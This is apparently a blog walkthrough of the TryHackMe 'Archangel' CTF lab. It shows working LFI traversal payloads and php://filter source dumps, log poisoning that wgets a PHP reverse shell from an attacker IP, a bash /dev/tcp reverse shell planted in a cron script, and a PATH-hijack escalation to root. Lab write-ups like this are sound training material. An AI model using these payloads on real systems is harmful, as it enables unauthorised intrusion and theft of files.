---
title: "TryHackMe: Archangel"
author: cilgin
date: 2025-06-18 00:38:49 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Easy]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-06-18-TryHackMe-Archangel/Archangel.png
---

# Enumeration

## Nmap Scan

I start with exporting the target machine IP adress as a enviroment variable:

```bash
export IP=10.10.58.58
```

And running `nmap` scan on the target:

```bash

```

## Enumerating The Website

First thing that I see is this:
![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo1.png){: width="972" height="589" }

So we need to add this domain to the `/etc/hosts`{: .filepath}.

And If we curl the website:

```bash
curl http://mafialive.thm
<h1>UNDER DEVELOPMENT</h1>
thm{*************************}
```

We find the first flag.

## Fuzzing the path's

I run `gobuster`:

```bash
❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.58.58/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,py,css,txt,md,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/flags                (Status: 301) [Size: 310] [--> http://10.10.58.58/flags/]
/images               (Status: 301) [Size: 311] [--> http://10.10.58.58/images/]
/index.html           (Status: 200) [Size: 19188]
/index.html           (Status: 200) [Size: 19188]
/layout               (Status: 301) [Size: 311] [--> http://10.10.58.58/layout/]
/licence.txt          (Status: 200) [Size: 5014]
/pages                (Status: 301) [Size: 310] [--> http://10.10.58.58/pages/]
/server-status        (Status: 403) [Size: 276]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

And there is `/flags` path we can use. I think I found the 2'nd flag:
![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo2.png){: width="972" height="589" }

Of course I'm not. Site redirects me to rickroll.

![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo3.png){: width="972" height="589" }

Time for enumerating <mafialive.thm>:

```bash
❯ gobuster dir -w common.txt -u http://mafialive.thm/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mafialive.thm/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              py,css,txt,md,js,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 59]
/index.html           (Status: 200) [Size: 59]
/robots.txt           (Status: 200) [Size: 34]
/robots.txt           (Status: 200) [Size: 34]
/server-status        (Status: 403) [Size: 278]
/test.php             (Status: 200) [Size: 286]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

`/test.php` look promising.

```bash
❯ curl http://mafialive.thm/test.php
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
            </div>
</body>

</html>
```

```bash
❯ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php"
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        Control is an illusion    </div>
</body>
```

Look's like we can use this file to `cat` out some files.

```bash
❯ curl "http://mafialive.thm/test.php?view=/etc/passwd"
<!DOCTYPE HTML>
<html>
<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        Sorry, Thats not allowed    </div>
</body>
</html>
```

Look's like we can't. Or can we? We can use Local File Inclusion (LFI) technique.

```bash
❯ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//etc/passwd"

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
    </div>
</body>

</html>
```

And we can try to read the flag:

```bash
❯ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//home/archangel/user.txt"

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        thm{lf1_t0_rc3_1s_tr1cky}
    </div>
</body>

</html>
```

We can also try to read the vulnerable files codes:

```bash
❯ curl "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php"

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==    </div>
</body>

</html>
```

```bash
❯ echo -e "PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==" | base64 -d
<?php echo 'Control is an illusion'; ?>
```

This looks normal. Let's try `/test.php`

```bash
❯ curl "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php"

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==    </div>
</body>

</html>


```

```bash
❯ echo -e "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	   //FLAG: thm{**************}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	   if(isset($_GET["view"])){
	   if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>
```

And we got another flag.

## Gaining Shell

We can also do some log poisoning for gaining shell.
For more info check this page:
<https://kwangyun.github.io/File-Inclusion-Log-Poisoning-RCE/>

1. Firstly i open a webserver serving pentestmonkey php reverse shell.
2. I downloaded the script to server

```bash
curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log&cmd=wget%2010.21.206.128/shell.php"
```

3. Opened the file and gained the reverse shell.

```bash
curl http://mafialive.thm/shell.php
```

## Upgrade the shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color

stty raw -echo;fg
reset
```

## Privilage Escalation

```bash
www-data@ubuntu:/home/archangel$ ls -la
total 44
drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .
drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..
-rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
-rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrc
drwx------ 2 archangel archangel 4096 Nov 18  2020 .cache
drwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local
-rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
-rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
```

There is nothing here expect secret. I'm not falling for rick roll again.

```bash
www-data@ubuntu:/opt$ ls -la
total 16
drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
www-data@ubuntu:/opt$ cat helloworld.sh
```

I found some files in the `/opt/`{: .filepath} directory.
Added bash reverse shell on helloworld.sh.
Which gives me archangel user.

```bash
www-data@ubuntu:/opt$ cat helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
bash -i >& /dev/tcp/10.21.206.128/4445 0>&1
```

And I found flag2:

```bash
archangel@ubuntu:~/secret$ ls
ls
backup
user2.txt
archangel@ubuntu:~/secret$ cat user2.txt
cat user2.txt
thm{********************************************}
```

Also there is a binary called backup with SUID permissons.
So I downloaded the binary to my machine and analyzed from there.

```bash
archangel@ubuntu:~/secret$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.21.206.128 - - [19/Jun/2025 00:00:01] "GET /backup HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```

```bash
❯ wget 10.10.186.65:8000/backup
Prepended http:// to '10.10.186.65:8000/backup'
--2025-06-18 21:30:01--  http://10.10.186.65:8000/backup
Connecting to 10.10.186.65:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16904 (17K) [application/octet-stream]
Saving to: ‘backup’

backup                    100%[=====================================>]  16.51K  --.-KB/s    in 0.07s

2025-06-18 21:30:02 (252 KB/s) - ‘backup’ saved [16904/16904]
```

1. I looked the strings and this is it. This binary executes this line `cp /home/user/archangel/myfiles/* /opt/backupfiles`

```bash
❯ strings backup
...
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
cp /home/user/archangel/myfiles/* /opt/backupfiles
:*3$"
GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
...
```

And cp binary is not specified so we can make ourselfs.
```bash
mkdir foo
cd foo/
export PATH=/tmp/foo:$PATH
echo "cat /root/root.txt" > cp
chmod +x cp
/home/archangel/secret/backup
thm{***************************************************************}
```
